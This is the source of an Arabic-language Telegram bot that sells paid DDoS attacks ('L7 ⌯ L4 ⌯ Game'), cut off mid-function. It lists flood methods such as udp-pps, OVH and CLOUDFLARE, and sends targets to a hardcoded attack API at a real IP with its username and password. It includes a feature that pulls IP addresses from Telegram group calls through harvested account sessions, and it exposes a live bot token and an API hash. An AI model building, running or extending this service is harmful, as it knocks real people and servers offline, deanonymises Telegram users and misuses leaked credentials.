import asyncio
import json as _json
import os
import random as _random
import threading
import time
from datetime import datetime, timedelta
import requests
import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.tl.functions.messages import (
    CheckChatInviteRequest,
    ImportChatInviteRequest,
)
from telethon.tl.functions.phone import (
    JoinGroupCallRequest,
    LeaveGroupCallRequest,
)
from telethon.tl.types import ChatInviteAlready, DataJSON, InputPeerSelf

TOKEN = "7624708352:AAGv6FTzaSMmOu6auYkj2cecAddou9bdPP0"
bot = telebot.TeleBot(TOKEN)

# إعدادات المطورين
MAIN_ADMIN = 7493679412
ADMINS = {MAIN_ADMIN}
DEV_USERNAME = "XX7X6"  # يوزر المطور بدون @

# قائمة الـ APIs الصحيحة والمحدثة
api_servers = [
    {
        "url": "http://212.47.65.141:5001/api/attack",
        "username": "DARK964",
        "password": "fgyujbho964",
    }
]

# تتبع الأهداف التي تحت الهجوم حالياً {target_key: expire_time}
active_attacks_on_targets = {}

# البيانات التخزينية
subscribers = {}
allowed_groups = set()
protected_targets = set()
mandatory_channels = set()
all_users = set()

# أكواد الاشتراك المنشأة
created_sub_codes = {}

# تتبع الأشخاص الذين شاهدوا الشروحات
users_watched_tutorials = {}

# بيانات النظام المجاني والإحالات والمحاولات
user_attempts = {}
user_referrals = {}
user_referral_links = {}

# إعدادات أوقات الهجمات الافتراضية
attack_limits_config = {
    "group_max_time": 60,
    "free_max_time": 60,
    "normal_max_time": 120,
    "vip_max_time": 300,
    "admin_max_time": 3600,
}

# إعدادات تليثون وسحب الـ IP
API_ID = int(os.environ.get("API_ID", 39424449))
API_HASH = os.environ.get("API_HASH", "8051b83850477396b863299a5ea103db")

DEFAULT_SESSION_STRING = os.environ.get("SESSION_STRING", "")

user_telethon_sessions = {}
public_sessions = []
if DEFAULT_SESSION_STRING:
  public_sessions.append(DEFAULT_SESSION_STRING)

keep_alive_sessions = {}
running = True

tutorials = {
    "iphone": {
        "video_id": None,
        "caption": "لا يوجد شرح متوفر حالياً",
        "file_id": None,
    },
    "android": {
        "video_id": None,
        "caption": "لا يوجد شرح متوفر حالياً",
        "file_id": None,
    },
}
attack_gif_id = None

# الأوضاع والتنبيهات
free_mode = True
maintenance_mode = False
notify_alerts = False

user_states = {}


def is_admin(user_id):
  return user_id in ADMINS


def check_mandatory_subs(user_id):
  if is_admin(user_id):
    return []
  missing_channels = []
  for ch in mandatory_channels:
    try:
      member = bot.get_chat_member(ch, user_id)
      if member.status not in ["creator", "administrator", "member"]:
        missing_channels.append(ch)
    except Exception:
      pass
  return missing_channels


def check_subscription(user_id):
  if is_admin(user_id):
    return "ADMIN", None
  if user_id in subscribers:
    sub = subscribers[user_id]
    if datetime.now() < sub["end"]:
      return sub["type"], sub["end"]
    else:
      del subscribers[user_id]
  return None, None


def update_user_attempts(user_id):
  current_time = time.time()
  if user_id not in user_attempts:
    user_attempts[user_id] = {
        "attempts_left": 10,
        "max_attempts": 10,
        "last_reset": current_time,
    }
  else:
    data = user_attempts[user_id]
    if current_time - data["last_reset"] >= 86400:
      data["attempts_left"] = data["max_attempts"]
      data["last_reset"] = current_time


def get_main_keyboard(user_id):
  markup = InlineKeyboardMarkup()
  sub_type, _ = check_subscription(user_id)
  has_sub = is_admin(user_id) or (sub_type is not None)

  watched = users_watched_tutorials.get(user_id, set())

  if has_sub:
    markup.row(
        InlineKeyboardButton("⚡ الهجوم القوي", callback_data="strong_attack"),
        InlineKeyboardButton(
            "💻 الهجوم الكلاسيكي", callback_data="classic_attack_info"
        ),
    )
    markup.row(
        InlineKeyboardButton("❖ طرق الهجوم MeThOdS ❖", callback_data="show_methods")
    )
    markup.row(
        InlineKeyboardButton("🎯 سحب IP", callback_data="cmd_extract_ip"),
        InlineKeyboardButton(
            "📱 إضافة حساب تليثون", callback_data="login_telethon_menu"
        ),
    )
  else:
    markup.row(
        InlineKeyboardButton("⚡ الهجوم القوي", callback_data="strong_attack"),
        InlineKeyboardButton(
            "💻 الهجوم الكلاسيكي", callback_data="classic_attack_info"
        ),
    )
    markup.row(
        InlineKeyboardButton("❖ طرق الهجوم MeThOdS ❖", callback_data="show_methods")
    )
    markup.row(
        InlineKeyboardButton("🎯 سحب IP", callback_data="cmd_extract_ip"),
        InlineKeyboardButton(
            "📱 إضافة حساب تليثون", callback_data="login_telethon_menu"
        ),
    )
    if free_mode:
      markup.row(
          InlineKeyboardButton("➕ إضافة هجمات +2", callback_data="referral_info"),
          InlineKeyboardButton(
              "💎 شراء هجمات لانهائية", url=f"https://t.me/{DEV_USERNAME}"
          ),
      )

  tut_row = []
  if "iphone" not in watched:
    tut_row.append(
        InlineKeyboardButton(
            "📱 الشرح الخاص بالآيفون", callback_data="show_iphone"
        )
    )
  if "android" not in watched:
    tut_row.append(
        InlineKeyboardButton(
            "🤖 الشرح الخاص بالأندرويد", callback_data="show_android"
        )
    )

  if tut_row:
    markup.row(*tut_row)

  if is_admin(user_id):
    markup.row(
        InlineKeyboardButton(
            "⚙️ إعدادات المطور والتحكم", callback_data="admin_settings_menu"
        )
    )

  return markup


@bot.message_handler(commands=["start"])
def start_cmd(message):
  user_id = message.from_user.id
  args = message.text.split()

  if message.chat.type == "private":
    all_users.add(user_id)
    if len(args) > 1:
      param = args[1]
      if param.startswith("sub_") and param in created_sub_codes:
        code_info = created_sub_codes.pop(param)
        sub_type = code_info["type"]
        days = code_info["days"]
        start_time = datetime.now()
        end_time = start_time + timedelta(days=days)
        name = message.from_user.first_name or "مستخدم"
        username = message.from_user.username or "لا يوجد"

        subscribers[user_id] = {
            "name": name,
            "username": username,
            "type": sub_type,
            "start": start_time.strftime("%Y-%m-%d %H:%M"),
            "end": end_time,
        }
        bot.reply_to(
            message,
            f"🎉 مبروك! تم تفعيل اشتراكك بنجاح عبر الرابط!\n\nنوع الاشتراك ⌯"
            f" {sub_type}\nتاريخ الانتهاء ⌯"
            f" {end_time.strftime('%Y-%m-%d %H:%M')}",
        )
      else:
        try:
          ref_id = int(param)
          if ref_id != user_id and ref_id in all_users:
            if user_id not in user_referral_links:
              user_referral_links[user_id] = ref_id
              if ref_id not in user_referrals:
                user_referrals[ref_id] = set()
              if user_id not in user_referrals[ref_id]:
                user_referrals[ref_id].add(user_id)
                if ref_id in user_attempts:
                  current_max = user_attempts[ref_id]["max_attempts"]
                  added_val = 2 if current_max < 20 else 1
                  user_attempts[ref_id]["max_attempts"] += added_val
                  user_attempts[ref_id]["attempts_left"] += added_val
        except Exception:
          pass

  missing = check_mandatory_subs(user_id)
  if missing:
    markup = InlineKeyboardMarkup(row_width=1)
    for ch in missing:
      markup.add(
          InlineKeyboardButton(
              f"انضم هنا {ch}", url=f"https://t.me/{ch.replace('@', '')}"
          )
      )
    bot.reply_to(
        message,
        "⚠️ يجب عليك الاشتراك في القنوات التالية لاستخدام البوت:",
        reply_markup=markup,
    )
    return

  sub_type, end_date = check_subscription(user_id)
  name = message.from_user.first_name or "المستخدم"

  if not is_admin(user_id) and not sub_type and not free_mode:
    dev_markup = InlineKeyboardMarkup(row_width=1)
    dev_markup.add(
        InlineKeyboardButton(
            "👨‍💻 تواصل مع المطور لتفعيل الاشتراك",
            url=f"https://t.me/{DEV_USERNAME}",
        )
    )
    bot.reply_to(
        message,
        "⚠️ البوت ليس مصرحاً لك باستخدامه والوضع المجاني معطل حالياً!\n\nيرجى"
        " التواصل مع المطور لتفعيل اشتراكك الخاص. 👇",
        reply_markup=dev_markup,
    )
    return

  if is_admin(user_id) or sub_type:
    sub_name = "مطور 👨‍💻" if is_admin(user_id) else sub_type
    start_date_str = (
        subscribers[user_id]["start"]
        if user_id in subscribers
        else "دائمي (مطور)"
    )
    end_date_str = (
        end_date.strftime("%Y-%m-%d %H:%M") if end_date else "غير محدود"
    )

    if end_date:
      diff = end_date - datetime.now()
      days = diff.days
      hours = diff.seconds // 3600
      minutes = (diff.seconds % 3600) // 60
      time_left_str = f"{days} يوم و {hours} ساعة و {minutes} دقيقة"
    else:
      time_left_str = "غير محدود"

    welcome_msg = (
        f'مرحبا بك يا "{name}" في بوت دارك لضرب الاتصالات\n'
        "  [L7 ⌯ L4 ⌯ Game]\n"
        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n"
        f"ID ⌯ {user_id}\n"
        f"نوع اشتراكك ⌯ {sub_name}\n"
        f"تاريخ تفعيل اشتراكك ⌯ {start_date_str}\n"
        f"تاريخ انتهاء اشتراكك ⌯ {end_date_str}\n"
        f"الوقت المتبقي ⌯ {time_left_str}"
    )
  else:
    update_user_attempts(user_id)
    att_data = user_attempts[user_id]
    attempts_left = att_data["attempts_left"]
    total_attempts = att_data["max_attempts"]
    reset_time_str = datetime.fromtimestamp(
        att_data["last_reset"] + 86400
    ).strftime("%Y-%m-%d %H:%M")

    welcome_msg = (
        f'مرحبا بك يا "{name}" في بوت دارك لضرب الاتصالات\n'
        "  [L7 ⌯ L4 ⌯ Game]\n"
        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n"
        f"ID ⌯ {user_id}\n"
        f"اجمالي عدد المحاولات ⌯ {total_attempts}\n"
        f"عدد المحاولات المتبقيه ⌯ {attempts_left}\n"
        f"تاريخ تجديد المحاولات ⌯ {reset_time_str}"
    )

  bot.reply_to(message, welcome_msg, reply_markup=get_main_keyboard(user_id))


@bot.message_handler(commands=["open"])
def open_group_cmd(message):
  if not is_admin(message.from_user.id):
    bot.reply_to(message, "⛔ هذا الأمر خاص بالمطور فقط.")
    return
  if message.chat.type in ["group", "supergroup"]:
    allowed_groups.add(message.chat.id)
    bot.reply_to(
        message,
        "✅ تم فتح البوت في هذه المجموعة! (الوقت الأقصى:"
        f" {attack_limits_config['group_max_time']} ثانية).",
    )


@bot.callback_query_handler(func=lambda call: True)
def callback_listener(call):
  global free_mode, maintenance_mode, notify_alerts

  user_id = call.from_user.id
  chat_id = call.message.chat.id

  if call.data == "show_iphone":
    if user_id not in users_watched_tutorials:
      users_watched_tutorials[user_id] = set()
    users_watched_tutorials[user_id].add("iphone")

    data = tutorials["iphone"]
    if data["video_id"]:
      bot.send_video(
          chat_id,
          data["video_id"],
          caption=f"📱 شرح آيفون:\n\n{data['caption']}",
      )
      if data["file_id"]:
        bot.send_document(chat_id, data["file_id"])
    else:
      bot.send_message(
          chat_id, "📱 تم إخفاء الزر! لا يوجد شرح آيفون مسجل حالياً."
      )

    bot.answer_callback_query(
        call.id, "تم مشاهدة الشرح وسيختفي الزر الآن!", show_alert=True
    )
    try:
      bot.edit_message_reply_markup(
          chat_id,
          call.message.message_id,
          reply_markup=get_main_keyboard(user_id),
      )
    except Exception:
      pass
    return

  elif call.data == "show_android":
    if user_id not in users_watched_tutorials:
      users_watched_tutorials[user_id] = set()
    users_watched_tutorials[user_id].add("android")

    data = tutorials["android"]
    if data["video_id"]:
      bot.send_video(
          chat_id,
          data["video_id"],
          caption=f"🤖 شرح أندرويد:\n\n{data['caption']}",
      )
      if data["file_id"]:
        bot.send_document(chat_id, data["file_id"])
    else:
      bot.send_message(
          chat_id, "🤖 تم إخفاء الزر! لا يوجد شرح أندرويد مسجل حالياً."
      )

    bot.answer_callback_query(
        call.id, "تم مشاهدة الشرح وسيختفي الزر الآن!", show_alert=True
    )
    try:
      bot.edit_message_reply_markup(
          chat_id,
          call.message.message_id,
          reply_markup=get_main_keyboard(user_id),
      )
    except Exception:
      pass
    return

  elif call.data == "admin_settings_menu":
    if not is_admin(user_id):
      bot.answer_callback_query(call.id, "⛔ للمطور فقط!", show_alert=True)
      return
    markup = InlineKeyboardMarkup(row_width=1)
    free_st = "🟢 مفعل" if free_mode else "🔴 معطل"
    maint_st = "🟢 مفعل" if maintenance_mode else "🔴 معطل"
    alert_st = "🔔 مفعل" if notify_alerts else "🔕 معطل"

    markup.add(
        InlineKeyboardButton(
            f"🎁 الوضع المجاني ({free_st})", callback_data="toggle_free"
        ),
        InlineKeyboardButton(
            f"🔧 وضع الصيانة ({maint_st})", callback_data="toggle_maint"
        ),
        InlineKeyboardButton(
            f"🔔 جرس التنبيهات ({alert_st})", callback_data="toggle_alerts"
        ),
        InlineKeyboardButton(
            "⏱️ تعديل أوقات الهجمات والحدود", callback_data="edit_limits"
        ),
        InlineKeyboardButton(
            "➕ إضافة مشترك عادي/VIP/رابط", callback_data="admin_add_sub_menu"
        ),
        InlineKeyboardButton(
            "❌ إدارة المشتركين والحذف", callback_data="admin_subs_mgmt"
        ),
        InlineKeyboardButton(
            "🌐 إدارة الـ APIs المتعددة", callback_data="admin_api_mgmt"
        ),
        InlineKeyboardButton(
            "🛡️ إدارة الحماية والأهداف", callback_data="admin_prot_mgmt"
        ),
        InlineKeyboardButton(
            "📢 الإذاعة والإحصائيات", callback_data="admin_broadcast_menu"
        ),
        InlineKeyboardButton(
            "📢 الاشتراك الإجباري", callback_data="admin_fsub_menu"
        ),
        InlineKeyboardButton(
            "📱 إضافة حساب عام (للكل)", callback_data="add_public_telethon"
        ),
        InlineKeyboardButton(
            "🎬 تعيين المتحركة GIF", callback_data="set_gif"
        ),
        InlineKeyboardButton(
            "🎥 تعيين الشروحات", callback_data="admin_tut_menu"
        ),
        InlineKeyboardButton(
            "🔙 رجوع للقائمة الرئيسية", callback_data="back_home"
        ),
    )
    bot.edit_message_text(
        "⚙️ لوحة تحكم وإعدادات المطور:\nاختر ما تحب تعديله:",
        chat_id,
        call.message.message_id,
        reply_markup=markup,
    )
    bot.answer_callback_query(call.id)
    return

  elif call.data == "admin_api_mgmt":
    if not is_admin(user_id):
      return
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("➕ إضافة API جديد", callback_data="add_api"),
        InlineKeyboardButton("📋 عرض الـ APIs المضافة", callback_data="show_apis"),
        InlineKeyboardButton("🔙 رجوع", callback_data="admin_settings_menu"),
    )
    bot.edit_message_text(
        "🌐 إدارة روابط الـ APIs:",
        chat_id,
        call.message.message_id,
        reply_markup=markup,
    )
    bot.answer_callback_query(call.id)

  elif call.data == "add_api":
    if not is_admin(user_id):
      return
    user_states[user_id] = {"state": "waiting_api_info"}
    bot.send_message(
        chat_id,
        "🌐 أرسل الـ API الجديد بالشكل التالي:\n`رابط_الـapi اسم_المستخدم"
        " كلمة_المرور`\n\nمثال:\n`http://site.com:5001/api/attack USER PASS`",
        parse_mode="Markdown",
    )
    bot.answer_callback_query(call.id)

  elif call.data == "show_apis":
    if not is_admin(user_id):
      return
    t = f"📋 **قائمة الـ APIs المتاحة ({len(api_servers)}):**\n\n"
    for idx, srv in enumerate(api_servers, 1):
      t += (
          f"{idx}. رابط: `{srv['url']}`\nمستخدم: `{srv['username']}`\nكلمة المرور:"
          f" `{srv['password']}`\n------------------------\n"
      )
    bot.send_message(chat_id, t, parse_mode="Markdown")
    bot.answer_callback_query(call.id)

  elif call.data == "add_public_telethon":
    if not is_admin(user_id):
      return
    user_states[user_id] = {"state": "waiting_public_phone"}
    bot.send_message(
        chat_id,
        "📱 إضافة حساب عام جديد:\n\nأرسل رقم الهاتف مع الرمز الدولي (مثال:"
        " +9647xxxxxxxxx):",
    )
    bot.answer_callback_query(call.id)

  elif call.data == "admin_fsub_menu":
    if not is_admin(user_id):
      return
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(
            "➕ إضافة قناة اشتراك إجباري", callback_data="add_fsub"
        ),
        InlineKeyboardButton(
            "❌ حذف قناة اشتراك إجباري", callback_data="del_fsub"
        ),
        InlineKeyboardButton(
            "📺 عرض قنوات الاشتراك الإجباري", callback_data="show_fsub"
        ),
        InlineKeyboardButton("🔙 رجوع", callback_data="admin_settings_menu"),
    )
    bot.edit_message_text(
        "📢 إدارة الاشتراك الإجباري:",
        chat_id,
        call.message.message_id,
        reply_markup=markup,
    )
    bot.answer_callback_query(call.id)

  elif call.data == "add_fsub":
    if not is_admin(user_id):
      return
    user_states[user_id] = {"state": "waiting_add_fsub"}
    bot.send_message(chat_id, "📢 أرسل معرف القناة مسبوقاً بـ @ (مثال: @mychannel):")
    bot.answer_callback_query(call.id)

  elif call.data == "del_fsub":
    if not is_admin(user_id):
      return
    user_states[user_id] = {"state": "waiting_del_fsub"}
    bot.send_message(
        chat_id, "🗑️ أرسل معرف القناة المراد حذفها من الاشتراك الإجباري:"
    )
    bot.answer_callback_query(call.id)

  elif call.data == "show_fsub":
    if not is_admin(user_id):
      return
    if not mandatory_channels:
      bot.send_message(chat_id, "📭 لا توجد قنوات مفعلة للاشتراك الإجباري.")
    else:
      bot.send_message(
          chat_id,
          "📢 قنوات الاشتراك الإجباري:\n\n" + "\n".join(mandatory_channels),
      )
    bot.answer_callback_query(call.id)

  elif call.data == "set_gif":
    if not is_admin(user_id):
      return
    user_states[user_id] = {"state": "waiting_gif"}
    bot.send_message(chat_id, "🎬 أرسل صورة متحركة GIF الآن:")
    bot.answer_callback_query(call.id)

  elif call.data == "admin_tut_menu":
    if not is_admin(user_id):
      return
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(
            "🎥 تعيين شرح آيفون", callback_data="set_iphone"
        ),
        InlineKeyboardButton(
            "🎥 تعيين شرح أندرويد", callback_data="set_android"
        ),
        InlineKeyboardButton("🔙 رجوع", callback_data="admin_settings_menu"),
    )
    bot.edit_message_text(
        "🎥 إدارة فيديوهات الشروحات:",
        chat_id,
        call.message.message_id,
        reply_markup=markup,
    )
    bot.answer_callback_query(call.id)

  elif call.data in ["set_iphone", "set_android"]:
    if not is_admin(user_id):
      return
    target_os = "iphone" if call.data == "set_iphone" else "android"
    user_states[user_id] = {"state": "waiting_tut_video", "os": target_os}
    bot.send_message(chat_id, f"🎥 أرسل فيديو لشرح ({target_os.upper()}):")
    bot.answer_callback_query(call.id)

  elif call.data == "back_home":
    bot.delete_message(chat_id, call.message.message_id)

    class FakeMsg:

      def __init__(self, uid, cid):
        self.from_user = type("obj", (object,), {"id": uid, "first_name": "صديقي"})
        self.chat = type("obj", (object,), {"id": cid, "type": "private"})
        self.text = "/start"

    start_cmd(FakeMsg(user_id, chat_id))
    bot.answer_callback_query(call.id)
    return

  elif call.data == "referral_info":
    bot.answer_callback_query(call.id)
    bot_info = bot.get_me()
    bot_username = bot_info.username
    ref_link = f"https://t.me/{bot_username}?start={user_id}"

    top_text = "🏆 قائمة توب 10 للمشاركين بروابط الإحالة:\n\n"
    sorted_refs = sorted(
        user_referrals.items(), key=lambda x: len(x[1]), reverse=True
    )[:10]
    if not sorted_refs:
      top_text += "📭 لا يوجد مشاركون حتى الآن.\n\n"
    else:
      for idx, (uid, refs) in enumerate(sorted_refs, 1):
        try:
          u_info = bot.get_chat(uid)
          u_name = u_info.first_name or f"مستخدم {uid}"
        except:
          u_name = f"مستخدم {uid}"
        top_text += f"{idx}. {u_name} ⟵ {len(refs)} دعوة\n"

    msg_text = (
        f"{top_text}\n"
        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        "🔗 رابط الإحالة الخاص بك:\n"
        f"{ref_link}\n\n"
        "💡 شارك الرابط مع أصدقائك، وكل شخص يدخل عبر رابطك ويشترك بالقنوات"
        " سيحصل على +2 محاولات (إذا تجاوزت 20 محاولة ستصبح الزيادة +1 محاولة لكل"
        " شخص)."
    )
    bot.send_message(chat_id, msg_text)

  elif call.data == "strong_attack":
    if maintenance_mode and not is_admin(user_id):
      bot.answer_callback_query(
          call.id, "البوت الان في وضع الصيانه 🔧", show_alert=True
      )
      return

    sub_type, _ = check_subscription(user_id)
    if not is_admin(user_id) and not sub_type:
      if not free_mode:
        bot.answer_callback_query(
            call.id, "الوضع المجاني معطل حالياً!", show_alert=True
        )
        return
      update_user_attempts(user_id)
      if user_attempts[user_id]["attempts_left"] <= 0:
        bot.answer_callback_query(
            call.id,
            "❌ نفدت محاولاتك اليومية! انتظر حتى يتم تجديدها أو اشترك لفتح"
            " الهجمات بلا حدود.",
            show_alert=True,
        )
        return

    user_states[user_id] = {"state": "waiting_strong_attack"}
    bot.send_message(
        chat_id,
        "⚡ الهجوم القوي:\n\nأرسل الآن الـ IP والـ PORT بالشكل"
        " التالي:\n91.108.9.166 32000",
    )
    bot.answer_callback_query(call.id)

  elif call.data == "classic_attack_info":
    bot.answer_callback_query(call.id)
    bot.send_message(
        chat_id,
        "💻 طريقة الهجوم الكلاسيكي:\n\nأرسل الأمر في المحادثة بالشكل"
        " المباشر:\n/attack 91.108.9.166 32000 120 udp-pps\n\nيثبت هذا الأمر المدة"
        " وطريقة الهجوم بالطريقة التقليدية.",
    )

  elif call.data == "login_telethon_menu":
    # عرض خيارين لتسجيل الحساب (عبر كود الجلسة أو برقم الهاتف)
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(
            "🔑 إضافة عبر كود الجلسة (StringSession)",
            callback_data="login_by_string",
        ),
        InlineKeyboardButton(
            "📱 إضافة عبر رقم الهاتف (كلاسيكي)", callback_data="login_by_phone"
        ),
        InlineKeyboardButton("🔙 رجوع", callback_data="back_home"),
    )
    bot.edit_message_text(
        "📱 اختر طريقة إضافة حساب التليثون:",
        chat_id,
        call.message.message_id,
        reply_markup=markup,
    )
    bot.answer_callback_query(call.id)
    return

  elif call.data == "login_by_string":
    user_states[user_id] = {"state": "waiting_session_string"}
    bot.send_message(
        chat_id,
        "🔑 أرسل كود الجلسة (StringSession) الخاص بك الآن:",
    )
    bot.answer_callback_query(call.id)
    return

  elif call.data == "login_by_phone":
    user_states[user_id] = {"state": "waiting_phone"}
    bot.send_message(
        chat_id,
        "📱 تسجيل دخول برقم الهاتف:\n\nأرسل رقم الهاتف مع الرمز الدولي (مثال:"
        " +9647xxxxxxxxx):",
    )
    bot.answer_callback_query(call.id)
    return

  elif call.data == "cmd_extract_ip":
    bot.answer_callback_query(call.id)
    if user_id not in user_telethon_sessions and not public_sessions:
      bot.send_message(
          chat_id,
          "⚠️ يجب عليك تسجيل دخول حساب تليثون أولاً أو توفر حساب عام من المطور!",
      )
      return

    ask = bot.send_message(chat_id, "🔗 أرسل رابط الكروب أو القناة:")

    def on_link(m):
      lnk = m.text.strip()
      try:
        bot.delete_message(m.chat.id, ask.message_id)
      except Exception:
        pass
      _run_extract(user_id, chat_id, lnk)

    bot.register_next_step_handler(ask, on_link)

  elif call.data == "show_methods":
    bot.send_message(
        chat_id,
        "❖ ---------------------------------- ❖\n"
        "1️⃣ udp-pps\n2️⃣ UDP\n3️⃣ OVH\n4️⃣ SUBNET\n5️⃣ HOMEHOLD\n"
        "6️⃣ GAM\n7️⃣ DISCORD\n8️⃣ TLS\n9️⃣ CLOUDFLARE\n🔟 HTTPSBYPASS\n"
        "❖ ---------------------------------- ❖",
    )
    bot.answer_callback_query(call.id)

  elif call.data == "toggle_free":
    if not is_admin(user_id):
      return
    free_mode = not free_mode
    bot.answer_callback_query(
        call.id, f"تم تغيير وضع الوضع المجاني إلى: {free_mode}"
    )
    admin_settings_refresh(chat_id, call.message.message_id, user_id)

  elif call.data == "toggle_maint":
    if not is_admin(user_id):
      return
    maintenance_mode = not maintenance_mode
    bot.answer_callback_query(
        call.id, f"تم تغيير وضع الصيانة إلى: {maintenance_mode}"
    )
    admin_settings_refresh(chat_id, call.message.message_id, user_id)

  elif call.data == "toggle_alerts":
    if not is_admin(user_id):
      return
    notify_alerts = not notify_alerts
    bot.answer_callback_query(call.id, f"تنبيهات المطور: {notify_alerts}")
    admin_settings_refresh(chat_id, call.message.message_id, user_id)

  elif call.data == "edit_limits":
    if not is_admin(user_id):
      return
    user_states[user_id] = {"state": "waiting_edit_limits_type"}
    bot.send_message(
        chat_id,
        "⏱️ أرسل اسم الفئة والوقت الجديد بالثواني هكذا:\nfree 60 أو vip 300"
        " أو normal 120 أو group 60",
    )
    bot.answer_callback_query(call.id)

  elif call.data == "admin_add_sub_menu":
    if not is_admin(user_id):
      return
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("➕ إضافة مشترك عادي", callback_data="add_normal"),
        InlineKeyboardButton("⭐ إضافة مشترك VIP", callback_data="add_vip"),
        InlineKeyboardButton(
            "🔗 إنشاء رابط اشتراك محدود بالوقت",
            callback_data="create_sub_link",
        ),
        InlineKeyboardButton(
            "🔙 رجوع لإعدادات المطور", callback_data="admin_settings_menu"
        ),
    )
    bot.edit_message_text(
        "اختر خيار إضافة الاشتراك:",
        chat_id,
        call.message.message_id,
        reply_markup=markup,
    )
    bot.answer_callback_query(call.id)

  elif call.data == "create_sub_link":
    if not is_admin(user_id):
      return
    user_states[user_id] = {"state": "waiting_create_link_info"}
    bot.send_message(
        chat_id,
        "🔗 أرسل نوع الاشتراك وعدد الأيام لتوليد الرابط (مثال: Normal 30 أو VIP"
        " 15):",
    )
    bot.answer_callback_query(call.id)

  elif call.data == "admin_subs_mgmt":
    if not is_admin(user_id):
      return
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(
            "📋 عرض قائمة المشتركين", callback_data="show_subs"
        ),
        InlineKeyboardButton("❌ حذف مشترك", callback_data="del_sub"),
        InlineKeyboardButton(
            "🎁 تعويض مشترك معين", callback_data="comp_one"
        ),
        InlineKeyboardButton(
            "🌐 تعويض جميع المشتركين", callback_data="comp_all"
        ),
        InlineKeyboardButton("🔙 رجوع", callback_data="admin_settings_menu"),
    )
    bot.edit_message_text(
        "إدارة المشتركين:",
        chat_id,
        call.message.message_id,
        reply_markup=markup,
    )
    bot.answer_callback_query(call.id)

  elif call.data == "admin_prot_mgmt":
    if not is_admin(user_id):
      return
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(
            "🛡️ إضافة هدف للحماية", callback_data="add_prot"
        ),
        InlineKeyboardButton("🔓 فك الحماية عن هدف", callback_data="del_prot"),
        InlineKeyboardButton(
            "👁️ عرض الأهداف المحمية", callback_data="show_prot"
        ),
        InlineKeyboardButton("🔙 رجوع", callback_data="admin_settings_menu"),
    )
    bot.edit_message_text(
        "إدارة الحماية:", chat_id, call.message.message_id, reply_markup=markup
    )
    bot.answer_callback_query(call.id)

  elif call.data == "admin_broadcast_menu":
    if not is_admin(user_id):
      return
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(
            "📢 إذاعة للخاص فقط", callback_data="bc_private"
        ),
        InlineKeyboardButton(
            "🌐 إذاعة عامة (خاص + جروبات)", callback_data="bc_public"
        ),
        InlineKeyboardButton("📊 إحصائيات البوت", callback_data="bot_stats"),
        InlineKeyboardButton("🔙 رجوع", callback_data="admin_settings_menu"),
    )
    bot.edit_message_text(
        "الإذاعة والإحصائيات:",
        chat_id,
        call.message.message_id,
        reply_markup=markup,
    )
    bot.answer_callback_query(call.id)

  elif call.data in ["add_normal", "add_vip"]:
    if not is_admin(user_id):
      return
    sub_type = "Normal" if call.data == "add_normal" else "VIP"
    user_states[user_id] = {"state": f"waiting_add_{sub_type}"}
    bot.send_message(
        chat_id,
        "📥 أرسل أيدي المستخدم وعدد الأيام (مثال: 123456789 30):",
    )
    bot.answer_callback_query(call.id)

  elif call.data == "del_sub":
    if not is_admin(user_id):
      return
    user_states[user_id] = {"state": "waiting_del"}
    bot.send_message(chat_id, "🗑️ أرسل الأيدي للحذف:")
    bot.answer_callback_query(call.id)

  elif call.data == "show_subs":
    if not is_admin(user_id):
      return
    if not subscribers:
      bot.send_message(chat_id, "📭 لا يوجد مشتركين.")
    else:
      t = "📋 المشتركين:\n\n"
      for uid, info in subscribers.items():
        t += (
            f"اسم : {info['name']}\nيوزر ⌯ : @{info['username']}\nايدي ⌯ :"
            f" {uid}\nنوع ⌯ : {info['type']}\nينتهي ⌯ :"
            f" {info['end'].strftime('%Y-%m-%d')}\n----------------\n"
        )
      bot.send_message(chat_id, t)
    bot.answer_callback_query(call.id)

  elif call.data == "add_prot":
    if not is_admin(user_id):
      return
    user_states[user_id] = {"state": "waiting_prot_add"}
    bot.send_message(
        chat_id,
        "🛡️ أرسل الـ IP والـ PORT (مثال: 1.1.1.1 80):",
    )
    bot.answer_callback_query(call.id)

  elif call.data == "del_prot":
    if not is_admin(user_id):
      return
    user_states[user_id] = {"state": "waiting_del_prot"}
    bot.send_message(
        chat_id,
        "🔓 أرسل الـ IP والـ PORT لفك الحماية:",
    )
    bot.answer_callback_query(call.id)

  elif call.data == "show_prot":
    if not is_admin(user_id):
      return
    bot.send_message(
        chat_id,
        "🛡️ الأهداف المحمية:\n\n"
        + (
            "\n".join([f"{pt}" for pt in protected_targets])
            if protected_targets
            else "📭 لا توجد أهداف محمية."
        ),
    )
    bot.answer_callback_query(call.id)

  elif call.data == "bot_stats":
    if not is_admin(user_id):
      return
    stats_msg = (
        "📊 إحصائيات البوت:\n\n👤 المستخدمين:"
        f" {len(all_users)}\n⭐ المشتركين: {len(subscribers)}\n🏰 الكروبات"
        f" المفعلة: {len(allowed_groups)}"
    )
    bot.send_message(chat_id, stats_msg)
    bot.answer_callback_query(call.id)

  elif call.data == "bc_private":
    if not is_admin(user_id):
      return
    user_states[user_id] = {"state": "waiting_bc_private"}
    bot.send_message(chat_id, "📢 أرسل الرسالة للخاص فقط:")
    bot.answer_callback_query(call.id)

  elif call.data == "bc_public":
    if not is_admin(user_id):
      return
    user_states[user_id] = {"state": "waiting_bc_public"}
    bot.send_message(chat_id, "🌐 أرسل الرسالة للخاص والمجموعات:")
    bot.answer_callback_query(call.id)


def admin_settings_refresh(chat_id, msg_id, user_id):
  markup = InlineKeyboardMarkup(row_width=1)
